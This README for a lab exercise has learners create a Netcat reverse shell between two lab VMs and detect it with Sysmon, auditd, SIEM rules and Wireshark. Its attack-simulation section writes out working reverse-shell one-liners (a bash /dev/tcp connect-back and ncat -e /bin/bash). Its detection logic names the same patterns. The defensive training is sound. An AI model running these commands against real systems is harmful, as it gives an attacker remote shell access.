# Lab 03 - Reverse Shell Detection

## Objective

Create a basic reverse shell with Netcat between two lab VMs, capture it in Wireshark, and detect it from both process telemetry (command line) and network telemetry (a shell process holding an outbound connection).

## Lab setup

| Host | Role | Address |
|---|---|---|
| `attacker` | Kali Linux | 192.0.2.10 |
| `lab-target01` | Linux target with auditd or Sysmon for Linux, forwarding to SIEM | 192.0.2.20 |

Install **Sysmon for Linux** (event 1 = process create, event 3 = network connect) or enable auditd `execve` logging (`-a always,exit -F arch=b64 -S execve -k exec`). Run Wireshark or `tcpdump -i <iface> -w lab03.pcap port 4444` on the attacker during the test.

## Attack simulation

> **Authorized use only.** Run these steps only in an isolated lab that you own, against the lab VMs described in [docs/lab-environment.md](../../docs/lab-environment.md). The attack-side commands are standard, publicly documented tool usage for generating telemetry; they are not meant for any other system.

```bash
# Attacker: listen
nc -lvnp 4444

# Target: connect back (classic forms; most distros' nc lacks -e, so the bash form is the common one)
bash -c 'bash -i >& /dev/tcp/192.0.2.10/4444 0>&1'
# or, with ncat installed:
ncat 192.0.2.10 4444 -e /bin/bash
```

In the shell, run a few harmless commands (`id`, `hostname`, `uname -a`), then exit. Stop the capture.

## Log sources required

| Source | Event | Purpose |
|---|---|---|
| Sysmon for Linux | 1 (ProcessCreate) | command line with `/dev/tcp/` or `nc -e` |
| Sysmon for Linux | 3 (NetworkConnect) | shell/netcat with an outbound connection |
| auditd | `EXECVE` | command line if Sysmon is not available |
| Packet capture | pcap | plain-text shell traffic on the wire |

## Detection logic

- **Process rule:** netcat with `-e`/`-c`/`--exec`, any command line containing `/dev/tcp/`, or the `mkfifo` + `nc` relay pattern.
- **Network rule:** `bash`, `sh` or `nc` as the *image* of an outbound TCP connection. Interactive shells normally have no sockets of their own.
- **Packet view:** `detections/wireshark_filters.txt`. An unencrypted shell shows the `uid=` output in **Follow TCP Stream**.

### Detection files

| File | Format |
|---|---|
| [`detections/outbound_shell_connection.spl`](detections/outbound_shell_connection.spl) | Splunk SPL |
| [`detections/reverse_shell.eql`](detections/reverse_shell.eql) | Elastic EQL |
| [`detections/reverse_shell.kql`](detections/reverse_shell.kql) | KQL (Microsoft Sentinel / Defender) |
| [`detections/reverse_shell_process.spl`](detections/reverse_shell_process.spl) | Splunk SPL |
| [`detections/sigma/linux_reverse_shell_cmdline.yml`](detections/sigma/linux_reverse_shell_cmdline.yml) | Sigma |
| [`detections/wireshark_filters.txt`](detections/wireshark_filters.txt) | Wireshark filters |
| [`detections/sigma-converted/`](detections/sigma-converted/) | Sigma → SPL / Lucene, produced by `scripts/convert-sigma.sh` |

## MITRE ATT&CK mapping

| Tactic | Technique | ID |
|---|---|---|
| Execution | Command and Scripting Interpreter: Unix Shell | [T1059.004](https://attack.mitre.org/techniques/T1059/004/) |
| Command and Control | Non-Application Layer Protocol | [T1095](https://attack.mitre.org/techniques/T1095/) |

## Tuning notes

- `/dev/tcp/` is sometimes used in health-check scripts (`echo > /dev/tcp/host/port`). Allowlist those by parent process or script path.
- Administrators use `nc` for connectivity tests. Without `-e`/`-c` those are not matched.
- Encrypted shells (`openssl s_client`, `socat` with TLS) evade the packet view but still trigger the network rule (shell process + socket).

## Response steps

1. Kill the shell process and its parent; capture `ps -ef --forest` and `ss -tnp` output first.
2. Block the remote IP:port.
3. Find how the command got there: the parent process chain (web server? cron? SSH session?). Lab 04 continues the chain.
4. Check for persistence (crontab, systemd units, `~/.bashrc`, authorized_keys).

## Results

> **Not filled in yet.** This section is a template. Complete it after running the lab in your own environment. Record only what you actually observed.

| Item | Value |
|---|---|
| Date run | _fill in_ |
| SIEM / version | _fill in_ |
| Attack runs executed | _fill in_ |
| Alerts fired (true positives) | _fill in_ |
| Missed attack runs (false negatives) | _fill in_ |
| False positives before tuning | _fill in_ |
| False positives after tuning | _fill in_ |
| Mean time from attack to alert | _fill in_ |

**Evidence:** _add sanitized screenshots or exported results here (documentation IPs only, no real hostnames)._

**What I would change next time:** _fill in_
